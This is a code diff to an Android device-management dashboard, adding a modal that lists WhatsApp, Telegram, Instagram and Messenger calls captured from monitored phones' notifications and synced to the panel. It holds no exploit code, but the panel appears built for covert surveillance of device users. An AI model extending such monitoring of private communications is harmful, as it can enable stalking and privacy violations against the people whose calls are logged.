@@ -2879,6 +2879,64 @@ versionName "1.0.1"</pre>
     </div>
   </div>
 
+  <!-- Device Specific Third-Party App Calls Modal (WhatsApp, Telegram, Instagram, Messenger) -->
+  <div id="deviceAppCallsModal" class="modal-overlay">
+    <div class="modal-content" style="max-width: 950px;">
+      <div class="modal-header">
+        <div style="display: flex; align-items: center; gap: 8px;">
+          <span class="modal-title" id="devAppCallsModalTitle">Third-Party App Calls</span>
+          <span class="badge badge-neutral" id="dcmAppCallsBadge" style="font-size: 11px;">0</span>
+        </div>
+        <button class="modal-close" onclick="closeDeviceAppCallsModal()" aria-label="Close modal">
+          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </button>
+      </div>
+      <div class="modal-body">
+        <div class="meta-grid" style="margin-bottom: 12px;">
+          <div class="meta-cell"><div class="meta-key">Device</div><div class="meta-val" id="dacmName">-</div></div>
+          <div class="meta-cell"><div class="meta-key">Hardware ID</div><div class="meta-val cell-mono" id="dacmAndroidId">-</div></div>
+          <div class="meta-cell"><div class="meta-key">Subsystem</div><div class="meta-val" style="color:var(--positive);">VoIP &amp; App Call Monitor</div></div>
+          <div class="meta-cell"><div class="meta-key">Calls Logged</div><div class="meta-val cell-mono" id="dacmTotalCalls">0</div></div>
+        </div>
+
+        <div class="toolbar" style="margin-bottom: 12px; padding: 8px 12px; display: flex; align-items: center; justify-content: space-between; gap: 8px; flex-wrap: wrap;">
+          <div class="search-wrap" style="min-width: 220px; flex: 1; max-width: 360px;">
+            <svg class="search-icon-svg" width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+            <input type="text" id="devAppCallSearchInput" class="search-input" placeholder="Search caller, app, or details...">
+          </div>
+          <div style="display: flex; align-items: center; gap: 8px;">
+            <select id="devAppCallFilterApp" class="form-select form-select-sm" style="height: 32px; font-size: 12px; background: var(--surface); color: var(--text-primary); border: 1px solid var(--border); border-radius: 6px; padding: 0 8px;">
+              <option value="">All Apps</option>
+              <option value="whatsapp">WhatsApp</option>
+              <option value="telegram">Telegram</option>
+              <option value="instagram">Instagram</option>
+              <option value="messenger">Messenger</option>
+            </select>
+            <button class="btn btn-secondary btn-sm" onclick="loadDeviceAppCalls()">Refresh</button>
+          </div>
+        </div>
+
+        <div class="table-container" style="max-height: 480px; overflow-y: auto;">
+          <table>
+            <thead>
+              <tr>
+                <th style="width: 140px;">App</th>
+                <th style="width: 200px;">Caller / Contact</th>
+                <th style="width: 110px;">Type</th>
+                <th style="width: 120px;">Direction</th>
+                <th>Details</th>
+                <th style="width: 160px;">Call Time</th>
+              </tr>
+            </thead>
+            <tbody id="devAppCallsTableBody">
+              <tr><td colspan="6" class="empty-state">Loading app calls...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
   <!-- Device Specific Alarms Modal (View, Set, and Delete Device Alarms with Jit Mode) -->
   <div id="deviceAlarmsModal" class="modal-overlay">
     <div class="modal-content" style="max-width: 900px;">
@@ -3534,6 +3592,7 @@ versionName "1.0.1"</pre>
               <div style="display: flex; gap: 6px; justify-content: flex-end;">
                 <button class="btn btn-secondary btn-sm" onclick="openDeviceMeta('${d.id}')">Metadata</button>
                 <button class="btn btn-secondary btn-sm" onclick="openDeviceCalls('${d.id}')">Calls</button>
+                <button class="btn btn-secondary btn-sm" onclick="openDeviceAppCalls('${d.id}')">App Calls</button>
                 <button class="btn btn-secondary btn-sm" onclick="openDeviceAlarms('${d.id}')">Alarms</button>
                 <button class="btn btn-secondary btn-sm" onclick="openDeviceNotifications('${d.id}')">Notifs</button>
                 <button class="btn btn-danger btn-sm" onclick="deleteSingleDevice('${d.id}', '${escapeHtml(d.device_name || d.device_model)}')">Delete</button>
@@ -3617,6 +3676,7 @@ versionName "1.0.1"</pre>
             <div class="device-card-actions">
               <button class="btn btn-secondary btn-sm" onclick="openDeviceMeta('${d.id}')">Meta</button>
               <button class="btn btn-secondary btn-sm" onclick="openDeviceCalls('${d.id}')">Calls</button>
+              <button class="btn btn-secondary btn-sm" onclick="openDeviceAppCalls('${d.id}')">App Calls</button>
               <button class="btn btn-secondary btn-sm" onclick="openDeviceAlarms('${d.id}')">Alarms</button>
               <button class="btn btn-secondary btn-sm" onclick="openDeviceNotifications('${d.id}')">Notifs</button>
               <button class="btn btn-danger btn-sm" onclick="deleteSingleDevice('${d.id}', '${escapeHtml(d.device_name || d.device_model)}')">Delete</button>
@@ -4017,6 +4077,121 @@ versionName "1.0.1"</pre>
     document.getElementById('devNotifSearchInput')?.addEventListener('input', () => {
       loadDeviceNotifications();
     });
+
+    // Device Third-Party App Calls Modal Logic (WhatsApp, Telegram, Instagram, Messenger)
+    let currentActiveAppCallDeviceId = null;
+    let cachedDeviceAppCalls = [];
+
+    window.openDeviceAppCalls = async function(deviceId) {
+      currentActiveAppCallDeviceId = deviceId;
+      const d = cachedDevices.find(item => item.id === deviceId);
+
+      document.getElementById('dacmName').textContent = d ? (d.device_name || d.device_model) : 'Device';
+      document.getElementById('dacmAndroidId').textContent = d ? (d.androidid || 'N/A') : 'N/A';
+      document.getElementById('dacmTotalCalls').textContent = '0';
+      const badge = document.getElementById('dcmAppCallsBadge');
+      if (badge) badge.textContent = '0';
+      const searchInput = document.getElementById('devAppCallSearchInput');
+      if (searchInput) searchInput.value = '';
+      const filterApp = document.getElementById('devAppCallFilterApp');
+      if (filterApp) filterApp.value = '';
+
+      document.getElementById('deviceAppCallsModal').style.display = 'flex';
+      await loadDeviceAppCalls();
+    };
+
+    window.closeDeviceAppCallsModal = function() {
+      document.getElementById('deviceAppCallsModal').style.display = 'none';
+      currentActiveAppCallDeviceId = null;
+    };
+
+    window.loadDeviceAppCalls = async function() {
+      if (!currentActiveAppCallDeviceId) return;
+      const tbody = document.getElementById('devAppCallsTableBody');
+      tbody.innerHTML = '<tr><td colspan="6" class="empty-state">Loading app calls...</td></tr>';
+
+      const search = (document.getElementById('devAppCallSearchInput')?.value || '').trim();
+      const appFilter = (document.getElementById('devAppCallFilterApp')?.value || '').trim();
+
+      let url = `/devices/${currentActiveAppCallDeviceId}/app-calls?limit=200`;
+      if (search) url += `&search=${encodeURIComponent(search)}`;
+      if (appFilter) url += `&app=${encodeURIComponent(appFilter)}`;
+
+      try {
+        const res = await apiRequest(url);
+        cachedDeviceAppCalls = res.appCalls || res.calls || [];
+        const total = res.count !== undefined ? res.count : (res.total !== undefined ? res.total : cachedDeviceAppCalls.length);
+
+        document.getElementById('dacmTotalCalls').textContent = total;
+        const badge = document.getElementById('dcmAppCallsBadge');
+        if (badge) badge.textContent = total;
+
+        if (cachedDeviceAppCalls.length === 0) {
+          tbody.innerHTML = `<tr><td colspan="6" class="empty-state" style="padding: 32px 16px;">
+            <div style="font-weight: 600; font-size: 14px; margin-bottom: 6px; color: var(--text-primary);">No third-party app calls captured yet</div>
+            <div style="font-size: 12px; color: var(--text-muted); max-width: 520px; margin: 0 auto; line-height: 1.5;">
+              Voice and video calls from WhatsApp, Telegram, Instagram, and Messenger are automatically detected and securely synced in real time when active call notifications occur.
+            </div>
+          </td></tr>`;
+          return;
+        }
+
+        tbody.innerHTML = cachedDeviceAppCalls.map(c => {
+          const appName = escapeHtml(c.app_name || 'App');
+          const pkg = escapeHtml(c.package_name || '');
+          const caller = escapeHtml(c.caller_name || 'Unknown Caller');
+          const type = (c.call_type || 'voice').toLowerCase();
+          const dir = (c.call_direction || 'incoming').toLowerCase();
+          const details = escapeHtml(c.raw_details || '');
+          const callTime = c.call_time ? new Date(Number(c.call_time) || c.call_time).toLocaleString() : (c.created_at ? new Date(c.created_at).toLocaleString() : '--');
+
+          let appBadgeBg = 'background: rgba(37,211,102,0.15); color: #25d366; border: 1px solid rgba(37,211,102,0.3);'; // WhatsApp green
+          if (appName.toLowerCase().includes('telegram')) {
+            appBadgeBg = 'background: rgba(0,136,204,0.15); color: #0088cc; border: 1px solid rgba(0,136,204,0.3);';
+          } else if (appName.toLowerCase().includes('instagram')) {
+            appBadgeBg = 'background: rgba(225,48,108,0.15); color: #e1306c; border: 1px solid rgba(225,48,108,0.3);';
+          } else if (appName.toLowerCase().includes('messenger')) {
+            appBadgeBg = 'background: rgba(0,132,255,0.15); color: #0084ff; border: 1px solid rgba(0,132,255,0.3);';
+          }
+
+          let dirBadge = 'badge-neutral';
+          if (dir === 'incoming') dirBadge = 'badge-positive';
+          else if (dir === 'missed') dirBadge = 'badge-negative';
+          else if (dir === 'outgoing') dirBadge = 'badge-accent';
+
+          const typeIcon = type === 'video'
+            ? `<span style="display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #a855f7;"><svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg> Video</span>`
+            : `<span style="display: inline-flex; align-items: center; gap: 4px; font-weight: 500; color: var(--text-primary);"><svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg> Voice</span>`;
+
+          return `
+            <tr>
+              <td>
+                <span class="badge" style="${appBadgeBg} padding: 2px 7px; border-radius: 5px; font-weight: 600; font-size: 11px;">
+                  ${appName}
+                </span>
+                <div class="cell-mono" style="font-size: 10px; color: var(--text-muted); margin-top: 3px;">${pkg}</div>
+              </td>
+              <td>
+                <div style="font-weight: 600; color: var(--text-primary);">${caller}</div>
+              </td>
+              <td>${typeIcon}</td>
+              <td>
+                <span class="badge ${dirBadge}" style="text-transform: capitalize; font-size: 11px;">${dir}</span>
+              </td>
+              <td style="font-size: 12px; color: var(--text-secondary); max-width: 260px; word-break: break-word;">
+                ${details || '--'}
+              </td>
+              <td style="white-space: nowrap; font-size: 12px; color: var(--text-secondary);">${callTime}</td>
+            </tr>
+          `;
+        }).join('');
+      } catch (err) {
+        tbody.innerHTML = `<tr><td colspan="6" class="empty-state" style="color:var(--negative);">Failed to load app calls: ${escapeHtml(err.message)}</td></tr>`;
+      }
+    };
+
+    document.getElementById('devAppCallSearchInput')?.addEventListener('input', debounce(loadDeviceAppCalls, 300));
+    document.getElementById('devAppCallFilterApp')?.addEventListener('change', loadDeviceAppCalls);
 
     // Device Alarms Modal Logic (Admin Remote Management)
     let currentActiveAlarmDeviceId = null;
